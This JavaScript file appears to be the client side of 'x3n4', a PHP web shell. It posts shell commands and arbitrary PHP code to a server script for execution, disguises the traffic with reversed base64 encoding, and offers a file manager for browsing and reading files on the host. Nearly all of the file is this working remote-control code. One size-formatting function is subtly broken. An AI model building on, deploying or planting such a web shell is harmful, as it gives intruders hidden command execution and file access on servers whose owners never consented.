function x3n4 (opt) {
  'use strict';

  /* Options */
  var defaults = {
    version: 'v1.0.0',
    endpoint: 'x3n4.php',
    encryption: 'rb64',
    directorySeparator: '/',
  };
  var options = $.extend(true, defaults, opt);

  /* Encryption / Decryption */
  var encrypt = function(input) {
    switch (options.encryption) {
      case 'b64':
      return window.btoa(input);
      case 'rb64':
      return window.btoa(input).split('').reverse().join('');
    }
    return input;
  };
  var decrypt = function(input) {
    switch (options.encryption) {
      case 'b64':
      return window.atob(input);
      case 'rb64':
      return window.atob(input.split('').reverse().join(''));
    }
    return input;
  };

  /* Command-line interface */
  var CLI = function (a, b, c) {
    /* UI Containers */
    var stdout = a;
    var stdin = b;
    var button = c;
    /* Commands history */
    var history = {
      list: JSON.parse(window.localStorage.getItem('history') || '[]'),
      position: -1,
      up: function() {
        if (this.list.length === 0) return;
        if (this.position < (this.list.length - 1)) {
          this.position++;
        }
        this.render();
      },
      down: function () {
        if (this.list.length === 0) return;
        if (this.position >= 0) {
          this.position--;
        }
        this.render();
      },
      render: function () {
        stdin.val(this.list[(this.list.length - 1) - this.position]);
      },
      add: function (value) {
        this.list.push(value);
        this.position = -1;
        this.save();
      },
      clean: function () {
        this.list = [];
        window.localStorage.removeItem('history');
      },
      save: function () {
        window.localStorage.setItem('history', JSON.stringify(this.list));
      }
    };
    /* Console object */
    var self = {
      out: {
        clean: function() {
          stdout.html('');
        },
        write: function(html) {
          stdout.append(html);
          stdout.scrollTop(stdout[0].scrollHeight);
        }
      },
      in: {
        disable: function() {
          stdin.prop('disabled', true);
        },
        enable: function() {
          stdin.prop('disabled', false);
        },
        reset: function() {
          this.enable();
          stdin.val('').focus();
        },
        read: function() {
          return stdin.val();
        }
      },
      history: history,
      getBanner: function() {
        return $('#pwd').html();
      },
      setBanner: function(banner) {
        $('#pwd').html(banner);
      },
      sendCommand: function(command) {
        this.in.disable();
        this.history.add(command);
        /* Internal command handler */
        switch (command.trim()) {
          case 'clear':
            this.out.clean();
            this.in.reset();
            return;
          case 'exit':
            this.history.clean();
            break;
        }
        this.out.write(this.getBanner() + ' ' + command + '\n');
        /* Server-side command handler */
        var that = this;
        $.post(options.endpoint, {cmd: encrypt(command)}, function(data) {
          data = JSON.parse(decrypt(data));
          that.setBanner(data.banner);
          that.out.write(data.stdout);
          that.in.reset();
        });
      }
    };
    /* Console UI Callbacks */
    var onclick = function (ev) {
      self.sendCommand(self.in.read());
      self.in.reset();
    };
    var keypress = function (ev) {
      if ((ev.keyCode ? ev.keyCode : ev.which) == '13') {
        button.click();
      }
    };
    var keydown = function (ev) {
      var code = ev.keyCode ? ev.keyCode : ev.which;
      switch (code) {
        case 38:
        history.up();
        break;
        case 40:
        history.down();
        break;
      }
    };
    button.on('click', onclick);
    stdin.on('keypress', keypress);
    stdin.on('keydown', keydown);
    /* return instance */
    return self;
  };

  /* Run PHP Code */
  var Evaluator = function () {
    var self = {
      run: function (code) {
        var et1 = Date.now();
        var mechanism = $('#eval-mechanism').val() || 'auto';
        $.post(
          options.endpoint,
          {
            eval: encrypt(code),
            mechanism: mechanism
          },
          function(data) {
            var et = Date.now() - et1;
            data = JSON.parse(decrypt(data));
            $('#php-stdout').html(data.stdout || data);
            $('#eval-time-took').html('Request time: ' + et + 'ms. ' +
              (data.took ? 'PHP process time: ' + data.took + 'ms.' : ''));
          }
        );
      }
    };
    /* Console UI Callbacks */
    var onclick = function (ev) {
      var editor = window.editorPhp;
      var code = editor ? editor.getValue() : false || $('#php-code').val();
      if (code !== undefined) {
        self.run(code);
      }
    };
    $('#btnEval').on('click', onclick);
    /* return instance */
    return self;
  };

  /* File manager */
  var FileManager = function (elm) {
    var self = {
      elm: elm,
      formatSize: function (value) {
        var exp = Math.log(value) / Math.log(1024) | 0;
        return (this / Math.pow(1024, exp)).toFixed(2) + ' ' + (exp == 0 ? 'bytes': 'KMGTPEZY'[exp - 1] + 'B');
      },
      formatDate: function (d) {
        var date = new Date(d);
        return (date.getMonth() + 1) + '/' + date.getDate() + '/' + date.getFullYear();
      },
      safeTags: function (str) {
        return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
      },
      pathLinks: function (path) {
        var html = '';
        var cpath = '';
        $.each(path.split(options.directorySeparator), function (i, el) {
          if (el === '') return;
          cpath += options.directorySeparator + el;
          html += options.directorySeparator + '<a href="#file-manager" onclick="window.x3n4.fileManager.getDirectory(\'' + cpath + '\')" title="' + cpath + '">' + el + '</a>';
        });
        return html;
      },
      getDirectory: function (path) {
        // loadingStart();
        $.get(options.endpoint + '?dir=' + path, function (data) {
          //loadingStop();
          if (typeof data === 'string') {
            data = JSON.parse(decrypt(data));
          }
          self.renderDirectory(data);
        });
      },
      getFile: function (path) {
        self.elm.html('<p><i class="fa fa-chevron-right"></i> ' + this.pathLinks(path) + '</p>');
        // loadingStart();
        $.get(options.endpoint + '?file=' + path, function (data) {
          // loadingStop();
          if (typeof data === 'string') {
            data = JSON.parse(decrypt(data));
          }
          self.elm.append($('<pre>' + self.safeTags(data.content) + '</pre>'));
        });
      },
      renderDirectory: function (data) {
        var html = '<p class="pull-right">';
        if (data.isWritable) {
          html += '<button class="btn btn-default" title="Create new file"><small><i class="fa fa-plus"></i></small> <i class="fa fa-file-o"></i></button> ';
          html += '<button class="btn btn-default" title="Create new folder"><small><i class="fa fa-plus"></i></small> <i class="fa fa-folder-open-o"></i></button> ';
        }
        html += '</p>';
        html += '<p><i class="fa fa-chevron-right"></i> ' + this.pathLinks(data.path) + '</p>';
        html += '<div class="clearfix"></div>';
        html += '<div class="table-responsive">';
        html += '<table class="table"><thead><tr><th><input type="checkbox" /></span></th><th>Name</th><th>Permissions</th><th>Size</th><th>Modified date</th><th>Actions</th></tr></thead><tbody>';
        if (data.files) {
          $.each(data.files, function (i, el) {
            if (el.filename !== '.' && el.filename !== '..') {
              html += '<tr><td><input type="checkbox" /></td><td>';
              if (el.type === 'folder') {
                html += '<i class="fa fa-folder"></i> ';
                html += '<a href="#file-manager" onclick="window.x3n4.fileManager.getDirectory(\'' + el.fullpath + '\')" title="' + el.filename + '">' + el.filename + '</a>';
              } else {
                html += '<i class="fa fa-file-o"></i> ';
                html += '<a href="#file-manager" onclick="window.x3n4.fileManager.getFile(\'' + el.fullpath + '\')" title="' + el.filename + '">' + el.filename + '</a>';
              }

              html += '</td><td>' + (el.permissions ? el.permissions : '') + '</td>';
              html += '<td>' + (el.type !== 'folder' ? '<span data-toggle="tooltip" title="' + el.size + ' bytes">' + self.formatSize(el.size) : '') + '</span></td>';
              html += '<td>' + (el.modifiedAt && el.modifiedAt !== '' ? self.formatDate(el.modifiedAt) : '') + '</td>';
              html += '<td><button type="button" class="btn btn-default pull-right"><i class="fa fa-list"></i></button></td>';
              // ---
              html += '</tr>';
            }
          });
        }
        html += '</tbody></table></div>';
        self.elm.html(html);
      }
    };
    /* Console UI Callbacks */

    /* return instance */
    return self;
  };

  var checkUpdate = function() {
    var that = this;
    $.get('https://api.github.com/repos/jorge-matricali/x3n4/releases', function(data) {
      if (that.options.version !== data[0].tag_name) {
        that.console.out.write('/!\\ x3n4 ' + data[0].tag_name + " available. Type 'upgrade' to download the latest version automatically.\n");
      }
    });
  };

  return {
    options: options,
    console: new CLI($('#stdout'), $('#stdin'), $('#btnExecCommand')),
    evaluator: new Evaluator(),
    checkUpdate: checkUpdate,
    fileManager: new FileManager($('#file-manager')),
  };
}
